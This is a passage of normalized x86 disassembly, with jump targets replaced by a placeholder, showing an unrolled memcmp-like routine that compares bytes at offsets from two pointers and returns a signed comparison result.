cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ ecx - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ ecx - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ ecx - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ ecx - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ ecx - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x4 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
movzx eax [ edx - 0x1c ]
movzx esi [ ecx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
movzx eax [ edx - 0x19 ]
movzx esi [ ecx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1e ]
sub esi eax
je r-xdata
xor eax eax
movzx eax [ edx - 0x1a ]
movzx esi [ ecx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
jmp r-xdata
xor eax eax
movzx eax [ edx - 0x1f ]
movzx esi [ ecx - 0x1f ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
movzx esi al
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx esi [ ecx + 0x5 ]
movzx eax [ edx + 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1d ]
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1e ]
movzx eax [ edx - 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x8 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x6 ]
movzx eax [ edx + 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1d ]
movzx eax [ edx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx esi [ ecx + 0x9 ]
movzx eax [ edx + 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x7 ]
movzx eax [ edx + 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ ecx - 0x19 ]
movzx eax [ edx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x15 ]
movzx eax [ edx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x11 ]
movzx eax [ edx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xd ]
movzx eax [ edx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x9 ]
movzx eax [ edx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x5 ]
movzx eax [ edx - 0x5 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx - 0x1 ]
movzx ecx [ edx - 0x1 ]
sub eax ecx
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1a ]
movzx eax [ edx - 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x16 ]
movzx eax [ edx - 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x12 ]
movzx eax [ edx - 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0xc ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0xa ]
movzx eax [ edx + 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax [ ecx + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx esi [ ecx + 0xd ]
movzx eax [ edx + 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0xb ]
movzx eax [ edx + 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x10 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0xe ]
movzx eax [ edx + 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax [ ecx + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx esi [ ecx + 0x11 ]
movzx eax [ edx + 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0xf ]
movzx eax [ edx + 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x14 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x12 ]
movzx eax [ edx + 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax [ ecx + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx esi [ ecx + 0x15 ]
movzx eax [ edx + 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x13 ]
movzx eax [ edx + 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x18 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x16 ]
movzx eax [ edx + 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax [ ecx + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx esi [ ecx + 0x19 ]
movzx eax [ edx + 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x17 ]
movzx eax [ edx + 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x1c ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x1a ]
